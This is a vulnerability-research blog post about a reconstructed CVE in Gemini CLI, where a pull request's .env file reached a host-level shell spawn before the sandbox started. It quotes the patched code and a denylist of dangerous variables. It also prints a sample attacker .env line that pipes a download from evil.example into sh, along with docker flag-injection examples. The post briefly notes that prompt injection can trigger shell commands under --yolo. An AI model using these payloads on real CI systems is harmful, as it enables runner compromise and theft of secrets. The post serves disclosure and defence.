---
author: Nithissh
pubDatetime: 2026-07-24T00:00:00.000Z
title: "The Sandbox That Wasn't: Reversing CVE-2026-12537 in Gemini CLI"
featured: true
draft: false
tags:
  - vulnerability-research
  - cve
  - supply-chain
  - devsecops
description: "A CVE dropped against Gemini CLI with a 10.0 score and a two-line advisory that explained nothing. So I cloned the repo, read the patch backwards, and reconstructed how a .env file in a pull request turns into code execution on your CI runner — before the sandbox ever starts."
---

Here's a fun genre of security advisory: the one that tells you nothing.

CVE-2026-12537 landed against Google's Gemini CLI with a CVSS 4.0 score of **10.0** — the number you only see when everything is on fire at once. The description? Something about a "container launcher," a "maliciously crafted configuration file," and "pre-sandbox host-level code execution on headless CI systems." The GitHub advisory added a couple of sentences about folder trust and the `--yolo` flag, then stopped.

Ten-point-oh, and I still couldn't tell you what the actual bug was.

That phrase — *pre-sandbox host-level code execution* — is the interesting part though. It's admitting something specific: there's code that runs on the host **before** the sandbox has a chance to contain anything. The whole selling point of running an AI agent in a sandbox is that even if the model goes rogue, or the repo it's chewing on is malicious, the blast radius stays inside a container. "Pre-sandbox" means there's a window where that promise doesn't hold yet.

So I did the thing. Cloned the repo, found the fix, and read it backwards to figure out what it was fixing. This is the reconstruction.

---

## The setup: what "trust" means to a CLI

Gemini CLI has a concept called **folder trust**. The idea is sensible — when you point the tool at a directory, it might load configuration from that directory: a `.gemini/settings.json`, a `.env` file, custom sandbox profiles, MCP server definitions. Some of that config can do powerful things. So before honoring it, the CLI asks: *do I trust this folder?*

In interactive use, that question has an obvious answer path — it can prompt you, or read from your IDE's trust state, or check a local `trustedFolders.json` you've curated over time. A human is in the loop.

Now put the same tool in CI. There's no human, no TTY, no prompt to answer. This is exactly where `run-gemini-cli` — the GitHub Action wrapper — runs it: a workflow triggers, Gemini CLI spins up headless, reads the checked-out repo, and does its thing. Automated PR reviews, issue triage, that whole category of "let the agent look at it" workflows.

And here's the collision. On a `pull_request` trigger, **the code being checked out is the attacker's code.** Anyone can open a PR. The contents of that PR — every file, including any dotfile — are now sitting on the runner's disk, and the CLI is about to make a trust decision about the folder they live in.

Pre-patch, in headless mode, it made the wrong one.

---

## Reading the patch backwards

The cleanest way to understand a security fix is to look at what defensive code suddenly appeared. Let me show you the current `loadEnvironment` in `packages/cli/src/config/settings.ts` and point at the parts that are obviously scar tissue:

```typescript
export function loadEnvironment(
  settings: Settings,
  workspaceDir: string,
  isWorkspaceTrustedFn = isWorkspaceTrusted,
): void {
  const trustResult = isWorkspaceTrustedFn(settings, workspaceDir);
  const isTrusted = trustResult.isTrusted ?? false;

  // ... find the nearest .env file walking up from workspaceDir ...

  const parsedEnv = dotenv.parse(envFileContent);

  for (const key in parsedEnv) {
    let value = parsedEnv[key];

    // If the workspace is untrusted, only allow whitelisted variables.
    if (!isTrusted) {
      if (!AUTH_ENV_VAR_WHITELIST.includes(key)) {
        continue;
      }
      // Sanitize the value for untrusted sources
      value = sanitizeEnvVar(value);
    }

    // ... skip excluded project vars, then:
    if (!Object.hasOwn(process.env, key)) {
      process.env[key] = value;
    }
  }
}
```

Three things in there scream "we added this after something went wrong":

```typescript
const AUTH_ENV_VAR_WHITELIST = [
  'GEMINI_API_KEY',
  'GOOGLE_API_KEY',
  'GOOGLE_CLOUD_PROJECT',
  'GOOGLE_CLOUD_LOCATION',
];

export function sanitizeEnvVar(value: string): string {
  return value.replace(/[^a-zA-Z0-9\-_./]/g, '');
}

export const DEFAULT_EXCLUDED_ENV_VARS = [
  'DEBUG',
  'DEBUG_MODE',
  'GEMINI_CLI_IDE_SERVER_STDIO_COMMAND',
  'GEMINI_CLI_IDE_SERVER_STDIO_ARGS',
];
```

A whitelist of exactly four boring auth variables. A sanitizer that strips every character except `[a-zA-Z0-9-_./]` — which is to say, everything you'd use to build a shell command: no spaces, no `$`, no `;`, no `&`, no backticks, no quotes. And an explicit denylist that specifically names `GEMINI_CLI_IDE_SERVER_STDIO_COMMAND`.

You don't write a regex that surgically removes shell metacharacters from environment variable *values* unless those values were, at some point, reaching a shell. And you don't blocklist a variable literally named `..._STDIO_COMMAND` unless setting it used to make the CLI run a command.

So the shape of the bug is already visible from the fix: **untrusted `.env` values were flowing, unfiltered, into `process.env` — and from there into places that execute commands.** The patch's whole job is to make sure that when the workspace isn't trusted, the only things that survive are four API-key-shaped strings with the teeth filed off.

Which raises the obvious question the patch answers by omission: before this, in headless mode, *was* the workspace trusted?

---

## The trust decision

Here's the current trust check, in `packages/core/src/utils/trust.ts`:

```typescript
export function checkPathTrust(options: TrustOptions): TrustResult {
  if (process.env['GEMINI_CLI_TRUST_WORKSPACE'] === 'true') {
    return { isTrusted: true, source: 'env' };
  }

  if (!options.isFolderTrustEnabled) {
    return { isTrusted: true, source: undefined };
  }

  const ideTrust = ideContextStore.get()?.workspaceState?.isTrusted;
  if (ideTrust !== undefined) {
    return { isTrusted: ideTrust, source: 'ide' };
  }

  const folders = loadTrustedFolders();
  // ...
  const isTrusted = folders.isPathTrusted(options.path);
  return { isTrusted, source: isTrusted !== undefined ? 'file' : undefined };
}
```

Read what this does *now*: in a headless CI run, there's no IDE context, and there's no `trustedFolders.json` on a fresh runner — so `isPathTrusted` returns `undefined`, which collapses to `false` back in `loadEnvironment`. **Untrusted by default.** The only way to get trust in CI is to explicitly set `GEMINI_CLI_TRUST_WORKSPACE=true`, opting in.

That opt-in is the fix. The advisory's own remediation confirms it — it tells maintainers to set `GEMINI_TRUST_WORKSPACE: 'true'` for workflows they actually trust. You don't add an opt-*in* switch unless the old behavior was opt-*out*, i.e. trusted-until-told-otherwise.

The pre-patch behavior, reconstructed: **headless mode auto-trusted the workspace folder.** The reasoning was probably reasonable-sounding at the time — "there's no human to answer the trust prompt in CI, and blocking would break every automated workflow, so let's just proceed." It's the classic security-usability trade where usability quietly wins and nobody notices the trade was security.

Here's the decision, before and after:

```mermaid
flowchart TD
    A[Gemini CLI starts in CI] --> B{Headless mode?}
    B -->|"CI=true / GITHUB_ACTIONS=true"| C[Headless: yes]

    C --> D{"PRE-PATCH: trust the folder?"}
    D -->|"auto-trust in headless"| E["isTrusted = true<br/>load ALL of .env into process.env"]

    C --> F{"POST-PATCH: trust the folder?"}
    F -->|"no IDE ctx, no trustedFolders.json"| G["isTrusted = false<br/>only 4 whitelisted vars,<br/>values sanitized"]

    E --> H["Attacker-controlled env vars<br/>reach host command sinks"]
    G --> I["Attacker .env is inert"]

    style E fill:#ff6b6b,color:#000
    style H fill:#ff6b6b,color:#000
    style G fill:#51cf66,color:#000
    style I fill:#51cf66,color:#000
```

So the primitive an attacker gets is: **arbitrary control over `process.env` for the Gemini CLI process, by committing a `.env` file to a pull request.** That's it. That's the whole entry condition. Now — what's worth setting?

---

## From an env var to code on the host

This is where "pre-sandbox" pays off. Let me walk through what `packages/cli/src/utils/sandbox.ts` does with the environment *while it's still setting up the container*. Every one of these reads happens in the parent Node process, on the CI runner, outside any sandbox.

**The clean one — `GEMINI_SANDBOX_PROXY_COMMAND`:**

```typescript
const proxyCommand = process.env['GEMINI_SANDBOX_PROXY_COMMAND'];
// ...
proxyProcess = spawn(proxyCommand, {
  stdio: ['ignore', 'pipe', 'pipe'],
  shell: true,        // <-- runs through /bin/sh
  detached: true,
});
```

`shell: true` with a fully attacker-controlled string. This is not a subtle injection where you have to escape out of an existing command — the *entire* command is yours. Whatever you put in that variable runs through `/bin/sh -c` as the runner user. This is the textbook match for the advisory's CWE-78, and it fires during sandbox startup, on the host.

**The arg-injection one — `SANDBOX_FLAGS`:**

```typescript
if (process.env['SANDBOX_FLAGS']) {
  const flags = parse(process.env['SANDBOX_FLAGS'], process.env).filter(
    (f): f is string => typeof f === 'string',
  );
  args.push(...flags);
}
```

These flags get spliced straight into the `docker run` / `podman run` argument list. Even without a shell, you get to inject Docker flags — `-v /:/host` to bind-mount the entire host filesystem into the "sandbox," `--privileged`, `--entrypoint`, whatever. The sandbox is real, but you're the one writing its confinement rules.

**The MCP one — the variable the patch names by hand.** Remember `GEMINI_CLI_IDE_SERVER_STDIO_COMMAND` from the exclusion list? Here's why it's there, from `packages/core/src/ide/ide-connection-utils.ts`:

```typescript
export function getStdioConfigFromEnv(): StdioConfig | undefined {
  const command = process.env['GEMINI_CLI_IDE_SERVER_STDIO_COMMAND'];
  if (!command) return undefined;
  const argsStr = process.env['GEMINI_CLI_IDE_SERVER_STDIO_ARGS'];
  // ... parse argsStr as JSON array ...
  return { command, args };
}
```

And where that goes, in `ide-client.ts`:

```typescript
transport = new StdioClientTransport({ command, args });
await this.client.connect(transport);
```

`StdioClientTransport` spawns `command` with `args`. Set the env var, name any binary on the runner, hand it any argument list you like. Another host-level spawn, driven entirely by a variable the untrusted `.env` now controls.

Three sinks, one root cause. The patch closes all three from the same choke point — if the value never makes it into `process.env` in the first place, it doesn't matter how many sinks read from it downstream.

Here's the full path, source to sink:

```mermaid
sequenceDiagram
    participant Attacker
    participant PR as Pull Request
    participant Runner as CI Runner (host)
    participant Env as process.env
    participant Sink as spawn() / docker run

    Attacker->>PR: commit .gemini/.env with<br/>GEMINI_SANDBOX_PROXY_COMMAND=...
    PR->>Runner: workflow checks out untrusted code
    Runner->>Runner: gemini --sandbox -p "review this PR"
    Note over Runner: headless detected (CI=true)
    Runner->>Env: PRE-PATCH: folder auto-trusted<br/>loadEnvironment() copies ALL keys
    Env->>Sink: start_sandbox() reads<br/>GEMINI_SANDBOX_PROXY_COMMAND
    Sink->>Runner: spawn(cmd, { shell: true })
    Note over Runner: 💥 attacker code runs on HOST<br/>before the container exists
```

---

## Putting it together

Say a repo runs an automated review workflow — a common `run-gemini-cli` pattern:

```yaml
# .github/workflows/review.yml (the victim's workflow)
on: pull_request
jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: google-github-actions/run-gemini-cli@v0.1.21   # pre-fix
        with:
          prompt: "Review the changes in this pull request."
```

An attacker opens a PR that adds a single innocuous-looking file:

```bash
# .gemini/.env  — committed in the attacker's PR
GEMINI_SANDBOX_PROXY_COMMAND=sh -c 'curl -s https://evil.example/x | sh'
```

When the workflow runs on the PR:

1. `checkout` drops the attacker's `.gemini/.env` onto the runner.
2. Gemini CLI starts headless (`GITHUB_ACTIONS=true`), and — pre-patch — auto-trusts the workspace.
3. `loadEnvironment` reads the file and copies `GEMINI_SANDBOX_PROXY_COMMAND` verbatim into `process.env`.
4. `start_sandbox` sees a proxy command is set and runs `spawn(proxyCommand, { shell: true })`.
5. The attacker's command executes on the runner, as the workflow's user, with the workflow's secrets and its `GITHUB_TOKEN` in reach.

No prompt injection, no convincing the model of anything, no `--yolo`. The model never even enters the story. It's a config file and a trust decision that defaulted the wrong way.

The `--yolo` angle the advisory mentions is a real but *separate* weakness — that's the tool-allowlist bypass, where prompt injection through untrusted content can call `run_shell_command`. That path needs the model in the loop and a permissive allowlist. The env-var path is the nastier cousin: fully deterministic, model-independent, and it lands on the host instead of inside the sandbox.

---

## Why the sandbox didn't save anyone

The mental model people have for these agent sandboxes is "worst case, the bad code runs in a container and I throw the container away." That model has an unstated assumption: that everything dangerous happens *after* confinement starts.

The whole class of bug here is what happens in the gap between "process starts" and "container is up." Setting up a sandbox is itself work — reading config, resolving the proxy, building argument lists, sometimes shelling out to `docker network create` or a build script. All of that runs on the host with the host's privileges. If any of it consumes attacker-controlled input, the sandbox is irrelevant, because you've already won before its walls exist.

CVSS 4.0 rated this 10.0 with `VC:H/VI:H/VA:H` *and* `SC:H/SI:H/SA:H` — high impact to both the vulnerable system and the *subsequent* system. That second set of metrics is the CVSS 4.0 way of saying "this breaks out of the thing that was supposed to contain it." Which is exactly right: the sandbox is the subsequent system, and it never got a vote.

Interestingly, the CVSS 3.1 score for the same bug is only 7.8, because 3.1 has no clean way to express "escapes the sandbox." It models this as local (`AV:L`) with user interaction required (`UI:R`). That gap between 7.8 and 10.0 isn't vendors disagreeing about severity — it's an older scoring system that literally can't describe a containment escape, meeting a newer one that can. Worth remembering next time you triage by the 3.1 number alone.

---

## What I'd actually take from this

**The trust decision is the vulnerability, not the sinks.** There are at least three host-level command sinks downstream, and you could patch each one — quote the proxy command, allowlist the docker flags, validate the stdio binary. The team didn't chase sinks. They cut the flow at the source: untrusted folder → don't load the dangerous env vars at all. When you find yourself whack-a-moling sinks, back up and ask whether the data should have reached any of them.

**"No human to ask" is not "the answer is yes."** The root cause was headless mode treating the absence of a trust prompt as implicit trust. The safe default when you can't ask is *no*. Breaking some automated workflows is recoverable with an explicit `GEMINI_CLI_TRUST_WORKSPACE=true`; auto-executing PR-supplied config is not.

**Config files are input.** A `.env`, a `settings.json`, a `Dockerfile` in the repo — on a `pull_request` trigger these are every bit as attacker-controlled as a request body. If your CI reads them before it has decided whether to trust their author, you have this bug in some shape. Grep your own workflows for tools that ingest repo-local config on untrusted triggers; you'll find more than you'd like.

**Read the patch, not the advisory.** The advisory gave me a scary number and a vague sentence. The four-entry whitelist, the metacharacter-stripping regex, and one very specifically named variable in a denylist told me the entire story. Defensive code is a confession. Learn to read it.

---

## Fixing it, if you run this

If you use `run-gemini-cli` in CI: upgrade the action to `0.1.22`+ and the CLI to `0.39.1`+. That's the actual fix — untrusted-by-default in headless mode plus the env whitelist.

If you can't upgrade immediately, the defense-in-depth moves are: never run Gemini CLI against untrusted checkouts on a `pull_request` trigger that has secrets in scope (use `pull_request_target` deliberately or gate on maintainer approval), scrub the environment before invoking it, and don't hand CI runners standing credentials they don't need for the specific job.

And if you're building anything that sandboxes untrusted work — agents, CI, plugin hosts, whatever — go audit your own pre-sandbox window. Everything your setup code touches before the walls go up is running with your privileges, in the open. That's the part nobody watches, which is exactly why it's worth watching.

On to the next one.
